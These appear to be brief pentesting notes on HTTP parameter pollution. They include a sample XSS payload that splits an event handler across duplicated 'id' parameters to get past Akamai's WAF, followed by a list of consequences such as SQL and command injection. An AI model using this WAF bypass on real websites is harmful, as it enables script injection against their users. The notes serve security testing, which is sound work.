-> `&` and `;` used to separate the two parameters.

![[http 1.webp]]

Tip 1:- Invite functionality(flooded email)

Tip 2:- Akamai XSS WAF bypass
`?id=1&id=2`
``<input alue="1,2">``
?id="&id=onpointerrawupdate="a=confirm&id=a(1) -> ``<input value="", onpointerrawupdate="a=confirm,a(1)">



CONSEQUENCE 
-> SQL Injection
-> LDAP Injeciton
-> XML Injection
-> XPath Injection
-> Command Injection
-> Open redirect
-> Captcha bypass

PARAMETER TO LOOK FOR 
-> GET parameters
-> POST Parametere
-> COOKIE Parameters

